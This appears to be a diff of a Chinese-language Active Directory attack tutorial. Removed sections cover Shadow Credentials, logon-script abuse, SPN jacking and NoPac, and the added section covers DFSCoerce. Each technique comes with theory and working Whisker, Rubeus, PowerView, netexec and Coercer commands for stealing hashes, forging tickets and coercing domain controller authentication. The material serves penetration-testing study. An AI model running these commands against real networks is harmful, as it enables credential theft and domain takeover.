-<p><img src="/images/44.png" alt="44"></p>
-<h2><span id="shadow-credential-attack">Shadow Credential Attack</span></h2><p>Shadow Credentials 是一种通过利用 密钥信任 模型中使用的无密码认证功能，获得对 Active Directory 用户或计算机的控制的方式。假设我们有权限修改目标对象的 msDS-KeyCredentialLink 属性，在这种情况下，我们可以将一个替代凭证（如证书）添加到目标对象，从而控制该目标。</p>
-<p>一种名为 Whisker 的工具可以通过操控目标对象的 msDS-KeyCredentialLink 属性，实际向目标帐户添加 Shadow Credentials，从而实现对 Active Directory 用户和计算机帐户的接管。</p>
-<p>Shadow Credential 攻击在受控帐户具有对目标的<strong>GenericAll</strong>、<strong>GenericWrite</strong> 或者对目标的 <strong>msDS-KeyCredentialLink</strong> 属性的 <strong>WriteProperty</strong> 权限时是可行的。正如我们在 无密码认证 中提到的，我们可以添加替代凭证，并请求 TGT（票证授权票）来作为目标进行认证。</p>
-<h2><span id="ntlm-hash-with-shadow-credential-attack">NTLM hash with Shadow Credential Attack</span></h2><p>为了兼容性，当客户端使用 PKINIT 并需要与不支持 Kerberos 认证的服务通信时会使用 NTLM 进行认证。为了应对这一问题，Microsoft 引入了一种特殊的 服务票证 作为替代认证方法。<strong>该票证在其权限属性证书（PAC）中包含 NTLM 哈希，且该哈希存储在一个加密的 NTLM_SUPPLEMENTAL_CREDENTIAL 实体中</strong>。</p>
-<p>加密的 PAC 存储在票证中，而该票证是使用为其发放服务的密钥加密的。对于 TGT（票证授权票），该票证是使用 KRBTGT 账户的密钥加密的，客户端无法解密。为了获得一个可以解密的票证，客户端需要执行 Kerberos 用户对用户（U2U）认证。</p>
-<p>每当客户端请求 TGT 时，都会创建一个新的会话密钥。KDC 不会记录活动的会话密钥，而是从客户端的票证中提取该密钥。当用户请求 U2U TGS-REQ 时，KDC 使用目标用户的 TGT 作为响应中的额外票证。KDC 然后从 TGT 的加密部分提取会话密钥，并生成一个新的服务票证。</p>
-<p>上述意味着，如果我们请求一个 U2U 服务票证 来从自己到自己，我们将能够解密票证并访问 PAC 和 NTLM 哈希，因为加密该票证的密钥就在我们手中。通过修改 msDS-KeyCredentialLink 属性，我们还可以获取用户或计算机的 NTLM 哈希。</p>
-<p><img src="/images/45.png" alt="45"></p>
-<h2><span id="pre-requisites">Pre-requisites</span></h2><p>为了使此技术有效，必须具备以下条件，必须能够在目标用户或计算机上写入 <strong>msDS-KeyCredentialLink</strong> 属性。环境必须满足以下配置要求：</p>
-<ol>
-<li>目标域必须至少有一台运行 <strong>Windows Server 2016</strong> 或更高版本的 <strong>域控制器</strong>。</li>
-<li>域功能级别应为 <strong>Windows Server 2016</strong> 或更高版本。</li>
-<li>用于攻击的 <strong>域控制器</strong> 必须拥有其证书和密钥。这意味着组织必须具备 <strong>AD CS</strong>、<strong>PKI</strong>、<strong>CA</strong> 或类似的基础设施。</li>
-</ol>
-<p>如 ShutdownRepo 所提到的，前提条件 1 和 2 必须满足，因为 PKINIT 功能是在 Windows Server 2016 中引入的。前提条件 3 是必要的，因为在 AS_REQ 和 AS_REP 事务中的会话密钥交换过程中，DC 需要使用自己的证书和密钥。如果前提条件 3 不满足，则会引发 KRB-ERROR (16): KDC_ERR_PADATA_TYPE_NOSUPP 错误。</p>
-<h2><span id="abusing-shadow-credentials">Abusing Shadow Credentials</span></h2><p>为了在 Windows 中滥用 Shadow Credentials，我们将使用 Whisker。我们可以使用以下命令列出指定用户的msDS-KeyCredentialLink：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\ &gt;<span class="title">Whisker.exe</span> <span class="title">list</span> /<span class="title">target:admin</span> /<span class="title">domain</span>:123.<span class="title">com</span> /<span class="title">dc:dc</span>.123.<span class="title">com</span></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/46.png" alt="46"></p>
-<p>我们可以使用下面的命令向指定用户添加影子凭据：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\ &gt;<span class="title">Whisker.exe</span> <span class="title">add</span> /<span class="title">target:admin</span> /<span class="title">domain</span>:123.<span class="title">com</span> /<span class="title">dc:dc</span>.123.<span class="title">com</span></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/47.png" alt="47"></p>
-<p>然后可以通过Rubeus 获取 TGT 和 NTLM 哈希，要获取hash的话我们必须使用 &#x2F;getcredentials 选项：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">Rubeus.exe</span> <span class="title">asktgt</span> /<span class="title">user:admin</span> /<span class="title">certificate:base64</span> /<span class="title">password</span>:&quot;<span class="title">FZjWHO7ZMCcz7rpJ</span>&quot; /<span class="title">domain</span>:123.<span class="title">com</span> /<span class="title">dc:dc</span>.123.<span class="title">com</span> /<span class="title">getcredentials</span> /<span class="title">show</span></span></span><br></pre></td></tr></table></figure>
-
-<h1><span id="logon-scripts">Logon Scripts</span></h1><p>在 Active Directory 环境中，系统管理员使用登录脚本来自动化用户登录域时的各种任务或配置，例如映射和取消映射网络驱动器、审计和报告、收集信息以及环境自定义。为用户分配登录脚本有两种方法：第一种是通过用户属性对话框中的 配置文件 标签页中的 登录脚本 字段来指定，这会在内部更新 scriptPath 属性；第二种是通过使用 策略 来实现。</p>
-<h2><span id="the-scriptpath-attribute">The scriptPath Attribute</span></h2><p>在 <strong>MS-ADA3</strong> 中定义的 <code>scriptPath</code> 属性（是 <strong>User-Logon</strong> 属性集的一部分）指定了用户的登录脚本路径；当通过 <strong>ADUC</strong> 中用户属性对话框的 <strong>Profile</strong> 标签页的 <strong>Logon script</strong> 字段设置时，AD 会相应地更新 <code>scriptPath</code> 属性：</p>
-<p><img src="/images/48.png" alt="48"></p>
-<p><code>scriptPath</code> 属性支持批处理文件 (.bat)<em>、</em>命令文件 (.cmd)、可执行程序 (*.exe) 或任何通过 Windows 脚本宿主自动化技术托管的语言编写的程序，包括 VBScript 和 JScript。此外，KiXtart（一种登录脚本处理器和增强型批处理脚本语言）也可以使用。尽管支持多种语言，<code>scriptPath</code> 并不直接支持 PowerShell；不过，我们可以通过批处理文件和 VBScript 文件内运行 PowerShell 命令。</p>
-<p>为了使登录脚本能够在所有域控制器上复制，Windows 将登录脚本存储在 SYSVOL 网络共享中的 <code>scripts</code> 文件夹内（在域控制器上，物理路径为 <code>%systemroot%\SYSVOL\sysvol</code>）。<code>SYSVOL</code> 存储了域和系统策略，包括组策略对象（Group Policy Objects）。为了方便使用，<code>NETLOGON</code> 网络共享保存所有登录脚本，这些脚本位于 <code>%systemroot%\SYSVOL\sysvol\&lt;DOMAIN_DNS_NAME&gt;\scripts\</code> 文件夹内，这两个文件夹是相同的。</p>
-<p><code>LOGONSERVER</code> 环境变量可以帮助我们定位 <code>SYSVOL</code> 和 <code>NETLOGON</code> 网络共享，它的值为对当前用户进行身份验证的域控制器的 NetBIOS 名称。</p>
-<p>为了让 Windows 在用户登录域时执行登录脚本，必须通过 <code>scriptPath</code> 属性（即传统登录脚本）将它们放置在 <code>NETLOGON</code> 共享中。无法将它们存放在其他网络共享中，无论是本地还是远程共享。或者，可以通过组策略设置适用于所有域用户的登录脚本（即现代登录脚本），该设置位于 <strong>组策略</strong> &gt; <strong>用户配置</strong> &gt; <strong>Windows 设置</strong> &gt; <strong>脚本（登录&#x2F;注销）</strong> &gt; <strong>登录</strong>。</p>
-<p>除了 <code>scriptPath</code> 支持的所有语言外，这个 <strong>组策略</strong> 设置还支持使用 <strong>PowerShell 脚本</strong> 作为登录脚本</p>
-<p><img src="/images/49.png" alt="49"></p>
-<h3><span id="abusing-scriptpath">Abusing scriptPath</span></h3><p>在渗透测试中，滥用登录脚本通过对用户 <code>scriptPath</code> 属性的权限取决于我们是否可以读取或写入该属性，以及其他相关因素。</p>
-<h4><span id="write-scriptpath">Write scriptPath</span></h4><p>拥有写入用户脚本路径的权限为潜在的攻击路径开辟了途径。如果我们在 NETLOGON 共享的任何地方拥有写入权限（包括 NTFS 权限和共享权限），我们就可以将用户的脚本路径设置为自定义的攻击脚本。本节将重点介绍如何利用用户脚本路径的写入权限。</p>
-<h4><span id="read-scriptpath">Read scriptPath</span></h4><p>在我们没有权限写入用户 <code>scriptPath</code> 的情况下，拥有读取权限（这是默认设置）仍然可以带来好处：我们可以检查 <code>scriptPath</code> 指向的文件上的权限（使用如 <code>icacls</code> 等工具）。假设我们对该文件有写权限，那么我们可以执行与拥有 <code>scriptPath</code> 写权限相同的攻击，而不需要在 <code>NETLOGON</code> 中的任何位置具有写权限；当使用 “stub” 登陆脚本时，这一点尤为重要，其中 <code>scriptPath</code> 指向包含实际登录脚本代码的另一个文件，通常该文件存储在除了 <code>NETLOGON</code> 以外的网络共享中（而域用户可能对该网络共享拥有写权限）。</p>
-<h1><span id="spn-jacking">SPN Jacking</span></h1><p>SPN劫持（SPN Jacking）是一种利用WriteSPN权限的替代方法。在<a target="_blank" rel="noopener" href="https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/">SPN Jacking: An Edge Case in WriteSPN Abuse</a>这篇博客中，它实现了将DACL滥用与约束性委派结合起来，从而使得在密码破解不可行的情况下能够滥用WriteSPN。这种方法要求对网络权限和委派过程有更深入的理解，而且它的优势在于密码破解是可选的。</p>
-<p>为了更好地理解SPN劫持，我们首先回顾一下约束性委派是如何工作的。在约束性委派概述与Windows中的攻击部分中，我们展示了一个情境，其中我们攻陷了WEBSRV服务器，该服务器具有SQL&#x2F;DBSRV的约束性委派权限。</p>
-<p><img src="/images/50.png" alt="50"></p>
-<p>在本例中，我们可以通过验证 SQL 服务或将服务更改为 CIFS 等其他服务来入侵 DBSRV，但无法入侵图片中显示的其他服务器（FILESRV 或 EXCHSRV），因为 WEBSRV 的 SPN 中没有列出这些服务器。这就是 SPN 劫持发挥作用的地方。</p>
-<p>SPN 劫持的工作原理是使用 WriteSPN 权限从 DBSRV 中移除 SQL&#x2F;DBSRV 的SPN 并将其配置到目标计算机中。例如，如果我们想入侵 FILESRV，并拥有 WriteSPN 或类似权限，我们就可以将 SQL&#x2F;DBSRV 的SPN添加到 FILESRV 中。之后，如果我们为 SQL&#x2F;DBSRV 申请 TGS，它就会为 FILESRV 加密，允许我们冒充任何用户进入目标计算机。</p>
-<p>在本课中，我们将探讨滥用 SPN Jacking 的不同方法以及这种攻击的工作要求</p>
-<h2><span id="scenario">Scenario</span></h2><p>在这个场景中，我们已经攻陷了账户Gabriel，其凭据为Godisgood001。Gabriel是SRV01上本地管理员组的成员，并且拥有对WEB01的WriteSPN权限。通过这个账户，我们的目标是利用Gabriel的权限攻陷WEB01。</p>
-<p><img src="/images/51.png" alt="51"></p>
-<h2><span id="live-spn-jacking-detailed-explanation危险">Live SPN-Jacking Detailed Explanation(危险)</span></h2><p>Live SPN-Jacking 涉及对当前在网络环境中使用的 SPN 进行主动操控。因为它涉及对活跃的 SPN 进行操作，这需要深入地理解 Active Directory 的委托和权限机制。</p>
-<p><img src="/images/52.png" alt="52"></p>
-<p>我们使用powerview搜索<code>ServicePrincipalName</code>属性上的<code>WriteProperty</code>权限，该属性由系统GUID <code>f3a64788-5306-11d1-a9c5-0000f80367c1</code>引用，并解析为（Validated-SPN）。此外，我们还可以搜索任何允许我们修改SPN的其他权限，如<code>GenericAll</code>、<code>GenericWrite</code>等：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainComputer</span> | <span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com | ?&#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$</span>(<span class="built_in">ConvertTo-SID</span> gabriel)&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在这个场景中，我们探讨了一个配置了 Constrained Delegation 的服务器 SRV01，该服务器当前将一个 SPN 关联到 EXCH03 和 DBSRV003。重要的是，我们在 DBSRV003 和 WEB01 上拥有 WriteSPN 权限。</p>
-<p>通常，在已更新安全补丁的 Active Directory 环境中，只有 <strong>Domain Admins</strong> 才能将重复的 SPN 分配给不同的账户，因为这样做可能会引发冲突。尝试将已关联到 DBSRV003 的 SPN 分配给 WEB01，通常会被域控制器阻止，以防止出现此类冲突。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> WEB01 <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;serviceprincipalname=<span class="string">&#x27;dmserver/DBSRV003&#x27;</span>&#125; <span class="literal">-server</span> dc.<span class="number">123</span>.com <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/53.png" alt="53"></p>
-<p>如上面命令输出所示，发生了约束违规，意味着该 SPN 已与另一个账户关联。然而，凭借正确的权限，我们可以绕过此限制。首先，我们需要从 DBSRV003 中移除我们想要使用的 SPN。这样可以暂时消除该关联，从而使其能够被添加到 WEB01 上。</p>
-<p>在移除 SPN 之前，最好先获取 SPN 列表：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainComputer</span> DBSRV003 <span class="literal">-Properties</span> <span class="string">&#x27;serviceprincipalname&#x27;</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com | <span class="built_in">Select-Object</span> <span class="literal">-ExcludeProperty</span> serviceprincipalname</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/54.png" alt="54"></p>
-<p>要清除 SPN，我们可以也使用 PowerView 并通过命令 <code>Set-DomainObject</code> 和选项 <code>-Clear</code> 来指定我们想要清除的属性：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> DBSRV003 <span class="literal">-Clear</span> <span class="string">&#x27;serviceprincipalname&#x27;</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/55.png" alt="55"></p>
-<p>现在，SPN 不再被使用，我们可以将其分配给 WEB01 并执行攻击：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> WEB01 <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;serviceprincipalname=<span class="string">&#x27;dmserver/DBSRV003.123.com&#x27;</span>&#125; <span class="literal">-server</span> dc.<span class="number">123</span>.com <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<p>这种操作有效地重新路由了认证路径，从而让我们可以执行 S4U 攻击，获取 WEB01 的服务票据，并冒充特权用户。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe s4u /domain:<span class="number">123</span>.com /user:SRV01<span class="variable">$</span> /rc4:<span class="number">123123123123</span> /impersonateuser:administrator /msdsspn:<span class="string">&quot;123/123.123.com&quot;</span> /nowrap</span><br></pre></td></tr></table></figure>
-
-<p>票据中的服务名称本身并不能直接允许访问 WEB01，但是我们可以修改服务名称和主机名，将该票据用于目标计算机。我们将使用 HTTP&#x2F;WEB01 来连接到Powershell Remoting</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe tgssub /ticket:doIGtDCCBrCgAwIBBaEDAgEWooIF&lt;SNIP&gt; /altservice:HTTP/WEB01 /nowrap</span><br></pre></td></tr></table></figure>
-
-<p>恢复我们清除的 SPN 是一个好习惯。这不会影响我们拥有的票据。我们可以继续使用 PowerView 恢复 SPN：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> DBSRV003 <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;serviceprincipalname=<span class="string">&#x27;WSMAN/DBSRV003&#x27;</span>,<span class="string">&#x27;WSMAN/DBSRV003.inlanefreight.local&#x27;</span>,<span class="string">&#x27;TERMSRV/DBSRV003&#x27;</span>,<span class="string">&#x27;TERMSRV/DBSRV003.inlanefreight.local&#x27;</span>,<span class="string">&#x27;RestrictedKrbHost/DBSRV003&#x27;</span>,<span class="string">&#x27;HOST/DBSRV003&#x27;</span>,<span class="string">&#x27;RestrictedKrbHost/DBSRV003.inlanefreight.local&#x27;</span>,<span class="string">&#x27;HOST/DBSRV003.inlanefreight.local&#x27;</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<p>整个攻击路径如下所示：</p>
-<p><img src="/images/56.png" alt="56"></p>
-<h1><span id="samaccountname-spoofingnopac">sAMAccountName Spoofing(NoPac)</span></h1><p>NoPAC 攻击，通常与漏洞 CVE-2021-42278 和 CVE-2021-42287 相关，指的是一种方法，其中域用户可以通过所谓的 sAMAccountName 欺骗 来进行权限提升，并冒充任何特权账户。</p>
-<p>CVE-2021-42278 利用了 Active Directory 中 sAMAccountName 属性修改时缺乏限制的漏洞。默认情况下，Windows Active Directory 并没有对该属性进行严格的验证，特别是未确保计算机账户名以 $ 符号结尾，以便与用户账户区分开来。当我们对机器账户有足够权限时，可以将该账户的 sAMAccountName 修改为域控制器的名称，且不加 $ 符号。这一修改为冒充域控制器创造了条件。</p>
-<p>在将 sAMAccountName 修改为域控制器名称（去掉末尾的 $）后，我们可以利用 CVE-2021-42287 漏洞。该漏洞存在于 密钥分发中心（KDC） 中。在请求服务票据阶段，KDC 会在请求一个不存在的账户时，自动追加一个 $ 符号并重新查找。利用这一行为，我们可以请求一个使用修改后 sAMAccountName 的票证（TGT），然后请求一个服务票据。由于 KDC 无法找到该账户，它会添加 $ 符号，意外地匹配到合法的域控制器账户，最终我们获得一个具有域控制器权限的服务票据。</p>
-<h2><span id="understanding-the-privilege-attribute-certificate-pac">Understanding the Privilege Attribute Certificate (PAC)</span></h2><p>特权属性证书（PAC） 是在 Windows 环境中 Kerberos 认证使用的数据结构。它包含关于用户身份和组成员资格的重要信息，服务通过这些信息来执行访问控制决策。</p>
-<p>当用户从 KDC（密钥分发中心）请求 TGT（票证授予票证）时，KDC 会在 TGT 中包含一个 PAC。此 PAC 随后由服务在用户访问资源时用于确定其权限。</p>
-<p>PAC 包含几个关键的内容：</p>
+<h2><span id="ms-dfsnm-abuse-dfscoerce">MS-DFSNM abuse (DFSCoerce)</span></h2><h3><span id="理论">理论</span></h3><p>MS-DFSNM 是微软的分布式文件系统命名空间管理协议。它提供了一个 RPC 接口，用于管理 DFS 配置（docs.microsoft.com），并作为 RPC 接口提供。该接口可以通过 \pipe\netdfs SMB 命名管道访问。与其他 MS-RPC 滥用类似，这种攻击方法是通过使用依赖于远程 UNC 路径的特定方法来实现的。</p>
+<p>值得注意的是，这种强制攻击方法仅对域控制器有效。</p>
+<p>目前已知的利用接口：</p>
 <ul>
-<li><strong>用户 SID（安全标识符）</strong>：用户的唯一标识符。</li>
-<li><strong>组 SID</strong>：用户所属组的标识符。</li>
-<li><strong>用户权限</strong>：关于用户特权的信息。</li>
-<li><strong>登录信息</strong>：有关用户登录会话的详细信息，例如登录时间。</li>
+<li><strong>NetrDfsRemoveStdRoot</strong>、<strong>NetrDfsAddStdRoot</strong></li>
 </ul>
-<p>PAC 在 Kerberos 票据中的存在对于 Windows 域中访问控制的正确运作至关重要。如果域控制器返回没有 PAC 的 TGT（如 NoPAC 漏洞的情况），可能会导致访问控制被绕过或未被正确执行的安全问题。有关更多详细信息，请参阅 Microsoft 关于 PAC 的文档。</p>
-<h2><span id="enumeration">Enumeration</span></h2><p>使用netexec探测域控是否存在NoPac漏洞</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~kali netexec smb 192.168.1.1 -u 123 -p <span class="string">&#x27;123&#x27;</span> -M nopac</span><br></pre></td></tr></table></figure>
+<h3><span id="利用">利用</span></h3><p>使用netexec探测漏洞是否存在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains netexec smb 192.168.1.1 -u 123 -p 123 -M dfscoerce</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/57.png" alt="57"></p>
-<p>我们还需要知道的另一个信息是 MachineAccountQuota (MAQ)。这是一个域属性，默认情况下允许任何用户将最多 10 台计算机加入到域中。如果一个用户已经加入了 10 台计算机，那么该用户将无法再加入其他计算机。但是，如果其中一台计算机被删除，该用户就可以加入另一台计算机。这个设置意味着一个用户不能创建超过 10 台计算机。我们可以使用 PowerView 查询属性 ms-DS-MachineAccountQuota 的值。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; (<span class="built_in">Get-DomainObject</span> <span class="literal">-SearchScope</span> Base <span class="literal">-server</span> dc.<span class="number">123</span>.com).<span class="string">&quot;ms-ds-machineaccountquota&quot;</span></span><br></pre></td></tr></table></figure>
+<p>使用Coercer触发强制认证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 Coercer.py coerce --auth-type smb --filter-method-name NetrDfsRemoveStdRoot -u <span class="string">&#x27;123&#x27;</span> -p <span class="string">&#x27;123&#x27;</span> -d 123.com -t 123.123.com -l 1234.1234.com</span><br></pre></td></tr></table></figure>
 
-<p>如果我们想查询一个账户已经加入域的具体计算机数量，我们也可以使用 PowerView。为此，我们必须查询每台计算机并查找其 ms-DS-CreatorSID 属性（该属性记录了对象创建者的安全标识符）。我们首先开始查询是谁创建了计算机 COMPUTERTEST1：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$computerName</span> = <span class="string">&#x27;COMPUTERTEST1&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$computer</span> = <span class="built_in">Get-DomainComputer</span> <span class="literal">-Identity</span> <span class="variable">$computerName</span> <span class="literal">-Properties</span> <span class="string">&#x27;ms-DS-CreatorSID&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$sid</span> = (<span class="built_in">New-Object</span> System.Security.Principal.SecurityIdentifier(<span class="variable">$computer</span>.<span class="string">&#x27;ms-DS-CreatorSID&#x27;</span>, <span class="number">0</span>)).Value</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">ConvertFrom-SID</span> <span class="variable">$sid</span></span><br><span class="line"></span><br><span class="line">INLANEFREIGHT\aneudy</span><br></pre></td></tr></table></figure>
-
-<p>现在，如果我们想了解 aneudy 创建了多少台计算机，我们需要查询所有计算机的 ms-DS-CreatorSID 属性，并获取与 aneudy 的 SID 匹配的计算机：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="variable">$computers</span> = <span class="built_in">Get-DomainComputer</span> <span class="literal">-Filter</span> <span class="string">&#x27;(ms-DS-CreatorSID=*)&#x27;</span> <span class="literal">-Properties</span> name,ms<span class="literal">-ds-creatorsid</span></span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="variable">$aneudyComputers</span> = <span class="variable">$computers</span> | <span class="built_in">where</span> &#123; (<span class="built_in">New-Object</span> System.Security.Principal.SecurityIdentifier(<span class="variable">$_</span>.<span class="string">&quot;ms-ds-creatorsid&quot;</span>,<span class="number">0</span>)).Value <span class="operator">-eq</span> (<span class="built_in">ConvertTo-SID</span> aneudy) &#125;</span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="variable">$aneudyComputers</span>.Count</span><br><span class="line"></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>
-
-<p>理解这一点很重要，因为我们可能会获得一个已经达到该配额的账户的访问权限，而为了执行攻击，我们可能需要使用其中一台已经创建的计算机。</p>
-<h2><span id="abusing-samaccountname-spoofing-from-windows">Abusing sAMAccountName Spoofing from Windows</span></h2><p>要完成这次攻击，我们需要遵循一组特定的步骤：</p>
-<ol>
-<li>创建一个计算机账户： TEST01 。</li>
-<li>清除新计算机账户 TEST01 的 SPN 属性。</li>
-<li>滥用 CVE-2021-42278 并修改计算机 TEST01 的 sAMAccountName，使其与域控制器 DC03 匹配，不含 $ 。</li>
-<li>使用 TEST01 的凭据为其申请 TGT。</li>
-<li>将 TEST01 的 sAMAccountName 恢复为初始值。</li>
-<li>滥用 CVE-2021-42287 并使用 TEST01 TGT 向 S4U2self 申请服务单。</li>
-</ol>
-<p>注意：我们也可以使用现有账户，而不是创建新的计算机账户。</p>
-<p>使用powershell的AD模块添加机器用户（需要9389端口 Active Directory Web Services）：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$password</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Passw0rd&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">New-ADComputer</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com <span class="literal">-Name</span> <span class="string">&quot;test001&quot;</span> <span class="literal">-SamAccountName</span> <span class="string">&quot;test001&quot;</span> <span class="literal">-Path</span> <span class="string">&quot;CN=Computers,DC=123,DC=com&quot;</span> <span class="literal">-Enabled</span> <span class="variable">$true</span> <span class="literal">-AccountPassword</span> <span class="variable">$Password</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/58.png" alt="58"></p>
-<p>下一步，清除SPN（由于使用了SSPI接口，所以没有SPN）：</p>
-<p>清除SPN的原因：如果修改了 samAccountName、DnsHostname 或 msDS-AdditionalDnsHostName 这其中的一个，那么SPN将会使用新值替换，要是修改了samAccountName为域控的主机名，那么其SPN将会变成域控的SPN，便会导致后续的S4U请求异常，故要清除掉默认的SPN。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> <span class="string">&#x27;TEST01$&#x27;</span> <span class="literal">-Clear</span> <span class="string">&#x27;serviceprincipalname&#x27;</span> <span class="literal">-Domain</span> inlanefreight.local <span class="literal">-DomainController</span> <span class="number">172.123</span>.<span class="number">123.10</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<p>现在，我们已经准备好计算机账户，可以用来冒充域控制器。我们需要将机器账户从 TEST01 更改为 DC03：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-MachineAccountAttribute</span> <span class="literal">-MachineAccount</span> <span class="string">&quot;TEST01&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;DC03&quot;</span> <span class="literal">-Attribute</span> samaccountname <span class="literal">-Domain</span> <span class="number">123</span>.com <span class="literal">-DomainController</span> dc.<span class="number">123</span>.com <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/59.png" alt="59"></p>
-<p>我们现在以 DC03 的身份请求 TGT，但使用 TEST01 的凭据。由于 sAMAccountName 是 TEST01 的 DC03，它将作为计算机账户获取 TGT，但其中包含 DC03 的信息：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe asktgt /user:dc /password:<span class="string">&quot;Passw0rd&quot;</span> /domain:<span class="number">123</span>.com /dc:dc.<span class="number">123</span>.com /nowrap</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/60.png" alt="60"></p>
-<p>将 TEST01 的 sAMAccountName 恢复为原始值，因为接下来的步骤涉及请求服务票据，以便在目标机器上冒充管理员：</p>
